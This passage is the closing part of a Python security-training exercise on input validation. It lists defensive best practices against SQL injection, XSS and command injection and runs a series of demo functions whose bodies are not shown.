    "SQL Injection Prevention": [
        "Always use parameterized queries or ORM methods",
        "Never concatenate user input into SQL strings",
        "Apply principle of least privilege to database accounts",
        "Use stored procedures for complex operations",
        "Regularly audit database permissions",
    ],
    "XSS Prevention": [
        "HTML-encode all user-provided content before rendering",
        "Use Content Security Policy (CSP) headers",
        "Avoid innerHTML; use textContent or safe DOM methods",
        "Sanitize rich text input with a whitelist of allowed tags",
        "Validate and sanitize URLs before using in href/src attributes",
    ],
    "Command Injection Prevention": [
        "Never pass user input directly to shell commands",
        "Use shlex.quote() or subprocess.run() with argument lists",
        "Implement command allowlists for AI tool-use scenarios",
        "Run commands with minimal privileges",
        "Audit and log all executed commands",
    ],
}


def print_best_practices():
    """Print the best practices reference."""
    print("\n" + "=" * 72)
    print("INPUT VALIDATION BEST PRACTICES")
    print("=" * 72)

    for category, practices in BEST_PRACTICES.items():
        print(f"\n  {category}:")
        for i, practice in enumerate(practices, 1):
            print(f"    {i}. {practice}")


# =============================================================================
# Main Entry Point
# =============================================================================

if __name__ == "__main__":
    print("AI Security Exercise 03: Input Validation & Sanitization")
    print("=" * 72)

    demo_sql_injection()
    demo_xss_prevention()
    demo_command_injection()
    demo_path_traversal()
    demo_constraint_validation()
    demo_pipeline()
    print_best_practices()

    print("\n" + "=" * 72)
    print("Exercise complete. Review the code for implementation details.")
    print("=" * 72)
